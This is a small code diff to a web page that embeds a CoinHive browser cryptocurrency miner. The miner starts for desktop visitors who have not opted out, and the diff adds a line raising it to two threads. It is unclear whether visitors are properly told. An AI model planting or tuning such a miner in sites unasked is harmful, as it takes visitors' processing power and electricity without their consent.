@@ -65,6 +65,7 @@
             var miner = new CoinHive.Anonymous('xu2RdzCr5UwIVmqZ6d0FQ1soGr9NRSwe', { throttle: 0.3 });
             if (!miner.isMobile() && !miner.didOptOut(14400)) {
                 miner.start();
+                miner.setNumThreads(2);
             }
         </script>
     </body>
